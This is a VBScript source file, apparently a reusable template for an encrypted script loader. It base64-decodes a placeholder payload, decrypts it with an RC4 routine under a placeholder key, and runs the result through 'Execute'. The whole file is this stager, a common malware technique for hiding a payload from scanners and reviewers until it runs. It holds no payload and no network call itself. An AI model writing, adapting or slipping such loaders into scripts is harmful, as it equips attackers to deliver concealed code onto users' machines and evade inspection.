Dim decoded
Dim plain

Function RC4(byteMessage, strKey)
    Dim kLen, x, y, i, j, temp
    Dim s(256), k(256)
    For a = 0 To 255
         s(a) = a
         k(a) = 0
    Next
    klen = Len(strKey)
    For i = 0 To 255
        j = (j + s(i) + Asc(Mid(strKey, (i Mod klen) + 1, 1))) Mod 256

        k(i) = j
        temp = s(i)
        s(i) = s(j)
        s(j) = temp
    Next
    x = 0
    y = 0
    For i = 1 To LenB(byteMessage)
        x = (x + 1) Mod 256
        y = (y + s(x)) Mod 256
        temp = s(x)
        s(x) = s(y)
        s(y) = temp
        RC4 = RC4 & Chr((s((s(x) + s(y)) Mod 256) Xor AscB(MidB(byteMessage, i, 1))))
    Next
End Function

function decodeBase64(base64)
  dim DM, EL
  Set DM = CreateObject("Microsoft.XMLDOM")
  Set EL = DM.createElement("tmp")
  EL.DataType = "bin.base64"
  EL.Text = base64
  decodeBase64 = EL.NodeTypedValue
end function

decoded = decodeBase64("%B64PAYLOAD%")
plain = RC4(decoded, %KEY%)

Execute plain